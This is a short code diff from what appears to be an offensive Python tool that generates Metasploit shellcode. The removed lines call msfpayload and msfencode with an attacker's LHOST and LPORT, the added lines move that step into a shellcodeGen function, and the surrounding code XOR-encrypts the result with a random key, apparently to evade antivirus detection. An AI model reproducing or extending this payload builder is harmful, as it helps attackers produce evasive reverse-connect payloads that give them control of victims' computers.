@@ -5,6 +5,7 @@ import os
 import subprocess as subp
 from src.core import menus
 from src.core.main import *
+from src.windows.shellcode import shellcodeGen
 from time import sleep
 from itertools import izip, cycle
 from random import randint
@@ -96,22 +97,8 @@ while 1:
 			if iterations == '':
 				iterations = 10
 				
-		# create payload
-		if encoding == '1':
-			PrintInfo("Creating shellcode with x%s %s. Please wait..." % (iterations, encoder))
-			print ""
-			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c \
-								| tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
-									% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
-			
-			shellcode = proc.communicate()[0]
-			
-		elif encoding == '2':
-			PrintInfo("Generating Shellcode. Please wait...")
-			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s C " \
-								% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
-								
-			shellcode = proc.communicate()[0]
+		# create shellcode
+		shellcodeGen(path, encoding, payload, ip, port, iterations, encoder)
 
 		key = generate_random_string(randint(1,10), randint(10000,100000))
 		PrintInfo("Starting XOR encryption with %s digit random key" % key[1])
